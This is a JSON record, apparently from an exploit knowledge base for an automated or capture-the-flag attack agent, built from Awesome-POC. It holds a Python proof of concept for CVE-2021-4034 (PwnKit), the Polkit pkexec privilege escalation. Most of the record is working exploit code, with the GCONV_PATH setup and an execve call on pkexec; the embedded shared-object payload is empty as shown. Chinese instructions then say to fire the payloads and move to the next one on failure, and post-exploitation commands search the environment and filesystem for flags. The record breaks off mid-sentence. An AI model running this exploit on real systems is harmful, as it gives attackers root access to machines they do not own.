{"id": "awesome-poc:cve-2021-4034", "kind": "poc", "title": "Linux Polkit 权限提升漏洞 CVE-2021-4034", "technique": "unknown", "summary": "操作系统漏洞 / CVE-2021-4034。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2021-4034 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["操作系统漏洞", "CVE-2021-4034"], "payload_template": "#!/usr/bin/env python3\n\n# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys\n# hardcoded amd64 lib\nfrom ctypes import *\nfrom ctypes.util import find_library\nimport os\nimport zlib\nimport base64\nimport tempfile\n\npayload = zlib.decompress(\n    base64.b64decode(\n        \"\"\"\"\"\"\n    )\n)\nlibc = CDLL(find_library(\"c\"))\nlibc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)\nlibc.execve.restype = c_ssize_t\n\nwd = tempfile.mkdtemp()\nopen(wd + \"/pwn.so\", \"wb\").write(payload)\nos.mkdir(wd + \"/gconv/\")\nopen(wd + \"/gconv/gconv-modules\", \"w\").write(\n    \"module  UTF-8//    INTERNAL    ../pwn    2\"\n)\nos.mkdir(wd + \"/GCONV_PATH=.\")\nos.mknod(wd + \"/GCONV_PATH=./gconv\")\nos.chmod(wd + \"/GCONV_PATH=.\", 0o777)\nos.chmod(wd + \"/GCONV_PATH=./gconv\", 0o777)\nos.chmod(wd + \"/pwn.so\", 0o777)\nos.chdir(wd)\ncmd = b\"/usr/bin/pkexec\"\nargv = []\nenvp = [\n    b\"gconv\",\n    b\"PATH=GCONV_PATH=.\",\n    b\"LC_MESSAGES=en_US.UTF-8\",\n    b\"XAUTHORITY=../gconv\",\n    b\"\",\n]\n\ncargv = (c_char_p * (len(argv) + 1))(*argv, None)\ncenv = (c_char_p * (len(envp) + 1))(*envp, None)\nlibc.execve(cmd, cargv, cenv)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-4034 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断